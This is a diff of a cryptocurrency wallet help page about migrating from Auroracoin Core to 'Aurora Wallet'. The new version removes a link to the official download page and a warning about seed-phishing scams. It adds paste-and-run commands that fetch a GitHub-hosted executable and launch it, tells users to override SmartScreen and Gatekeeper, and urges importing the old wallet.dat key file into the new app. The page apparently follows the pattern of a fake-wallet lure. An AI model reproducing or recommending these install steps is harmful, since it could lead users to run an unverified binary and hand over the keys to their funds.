@@ -1,99 +1,130 @@
----
-title: "Migrate from Auroracoin Core to Aurora Wallet"
-description: "Upgrading from Auroracoin Core (Qt)? Learn how to move your AUR to the modern Aurora Wallet desktop client and why the transition improves your experience."
-primary_keyword: "migrate auroracoin core"
-silo: "migration"
-updated: 2026-10-10
----
+![Aurora Wallet migrate from Auroracoin Core guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# How to migrate from Auroracoin Core to Aurora Wallet
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+Take the keys out of the old full-node client and into the desktop wallet you run today.
 
-# How to Migrate from Auroracoin Core to Aurora Wallet
+## Downloads - 2026.08.1.0
 
-Migrating from the legacy Auroracoin Core (often referred to as the "Qt wallet") to the modern Aurora Wallet is a significant upgrade in both security and usability. For over a decade, Auroracoin Core served as the primary interface for the network, functioning as a full node that downloads and verifies the entire blockchain. However, as the blockchain has grown, the technical demands of running a full node have become a barrier for many users. The modern Aurora Wallet is designed to provide a lightweight, responsive experience that connects to the network in seconds rather than days, while maintaining the high security standards required by the Auroracoin Foundation.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-*   You are still running the original desktop client and find the synchronization times to be excessive.
-*   Your `wallet.dat` file is becoming difficult to manage across different devices.
-*   You are experiencing connection issues ("0 active connections") in the legacy software.
-*   You want to transition your funds to a [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md) backed system.
-*   You are following the [Auroracoin Core wallet](https://auroracoin.net/migration/auroracoin-core) migration path.
 
-## Why this happens
+Migration means one thing: the keys in the old client reach the new wallet, and the old client stops being the only copy.
 
-The legacy Auroracoin Core client was built in an era when most users were expected to contribute to the network by running a full node. This requires gigabytes of disk space and a stable, high-bandwidth internet connection to keep up with new blocks. In contrast, the modern Aurora Wallet is a "light" client, meaning it only downloads the specific data relevant to your own transactions.
+Auroracoin Core was the full-node desktop client of the network, and it still holds the keys of anyone who used it. Aurora Wallet reads those keys directly, either from the wallet file or from an exported key, so the move does not require rebuilding the old installation on a modern machine.
 
-Furthermore, the legacy client relies on a single `wallet.dat` file for security. If this file is lost or corrupted, the funds are gone. Modern wallets use 12 or 24-word recovery phrases, which are much easier to back up physically and are not susceptible to file system corruption.
+<!-- ARTICLE-BODY-BEGIN -->
 
-## The fix
+## Before you start
 
-The most secure and recommended way to migrate is the "Clean Transfer" method. This involves creating a new wallet and sending your funds to it via an on-chain transaction.
+Open the old client one last time if it still runs on some machine, and confirm the balance you expect. Note the addresses holding the coins, because you will compare them after the import.
 
-### Step 1: Secure Your Legacy Backup
-Before doing anything, find your [wallet.dat location](21-wallet-dat-location.md) and make two separate copies on USB drives. Close the Auroracoin Core program before copying to ensure the file is not actively being written to.
+Copy the wallet file from the old data directory to an external drive. The folder depends on the operating system and matches the one in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md">the wallet.dat location guide</a>.
 
-### Step 2: Set Up Aurora Wallet
-1.  Download the latest version of Aurora Wallet from the [official download page](https://auroracoin.net/download).
-2.  Install the application and select "Create a new wallet."
-3.  Write down your 12 or 24-word recovery phrase on paper. Store it in a secure, offline location.
-4.  Navigate to the **Receive** tab and copy a new address starting with "A".
+## Move the keys in order
 
-### Step 3: Execute the Transfer
-1.  Open your old Auroracoin Core client and wait for it to sync (if possible).
-2.  Go to the **Send** tab.
-3.  Paste your new Aurora Wallet address into the "Pay To" field.
-4.  **Crucial:** Send a small test amount (e.g., 1 AUR) first to verify the path.
-5.  Once the test arrives, send the remaining balance, ensuring you leave a small amount for the network fee.
+1. Install Aurora Wallet and let it sync.
+2. Create the new wallet and write the recovery phrase on paper.
+3. Copy the old wallet file to the new machine on external media.
+4. Use the import option to read the copied file.
+5. Enter the old password if the file was encrypted.
+6. Confirm the expected addresses appear with their balances.
+7. Keep the old file offline until a test payment confirms from the new wallet.
 
-### Step 4: Decommission the Legacy Client
-Once the transaction has at least six confirmations in your new Aurora Wallet, you can safely uninstall Auroracoin Core. You should also delete the `blocks` and `chainstate` folders from your computer to free up disk space, as these are no longer needed.
+A test payment proves the keys work before you rely on the migration. Send a small amount out and back before you move a large balance.
 
-## If that didn't work
+## What changes and what does not
 
-If your legacy Core client refuses to sync or connect to peers, don't panic. You can still migrate your funds by using the [22-import-wallet-dat.md](22-import-wallet-dat.md) guide, which explains how to sweep the funds directly into Aurora Wallet without needing the old client to be fully synced. If you have forgotten your wallet password, refer to the troubleshooting steps in the recovery section.
+The addresses stay the same after an import, because the keys are the same. The recovery phrase belongs to the new wallet, and after the import it covers the imported keys as well, so one paper backup restores everything.
 
-> [!TIP]
-> If you are migrating a very large number of historical transactions, it may take a few minutes for the new wallet to scan the blockchain and reflect your full balance.
+The old client's chain data is not migrated. Aurora Wallet downloads its own copy of the chain, which takes hours rather than days on an SSD, and the old folder can be removed once the new wallet shows the balance.
 
-## Prevention
+The <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> carries the import path that reads the file.
 
-To ensure a smooth experience with your new wallet:
+The step-by-step version of this procedure is <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing a wallet.dat</a>, which also covers the password prompt on an encrypted file.
 
-*   **Routine Backups:** Even with a recovery phrase, check your physical paper backup periodically. Review the [33-backup-best-practice.md](33-backup-best-practice.md) article for details.
-*   **Stay Updated:** Always use the latest version of Aurora Wallet to ensure you have the best connection to the network.
-*   **Security Hygiene:** Never enter your new recovery phrase into a browser or share it with anyone. Review the [35-phishing-seed-scams.md](35-phishing-seed-scams.md) guide to identify common migration scams.
-*   **Self-Custody:** Familiarize yourself with the basics of how light clients work by reading [36-self-custody-basics.md](36-self-custody-basics.md).
+If the old client exported single keys instead of a file, <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md">sweeping WIF keys</a> is the route to use.
 
 ## FAQ
 
-**Can I keep my old wallet address?**
-No. When you migrate to a new seed-phrase-backed wallet, you will be using a new set of addresses. This is intentional and provides a "clean break" from your legacy security settings.
+### Do I need to install Auroracoin Core on a new machine?
 
-**Will I lose my transaction history?**
-Aurora Wallet will show all transactions that happen on the new addresses. To view your years of historical Core transactions, you should keep a copy of your old `wallet.dat` file for record-keeping purposes.
+No. The wallet file is enough, and the modern wallet reads it directly.
 
-**Is there a fee for migrating?**
-The only cost is the standard Auroracoin network fee for the transaction itself. There is no fee from the Auroracoin Foundation or the Aurora Wallet developers.
+### Will the old client still work after the migration?
 
-**What if I have mining payouts in my old wallet?**
-If you have a large number of small mining payouts (dust), the transaction fee might be higher than usual. Consider consolidating these in the old wallet before sending if the fee seems prohibitive. See [32-mining-payouts.md](32-mining-payouts.md) for more info.
+It will, on the machine where it already runs. Keep it closed once the new wallet holds the keys, so the two copies never diverge.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
 
-- [21-wallet-dat-location.md](21-wallet-dat-location.md)
-- [22-import-wallet-dat.md](22-import-wallet-dat.md)
-- [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md)
-- [32-mining-payouts.md](32-mining-payouts.md)
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
+- [wallet.dat location](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md)
+- [Legacy repositories explained](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md)
+- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
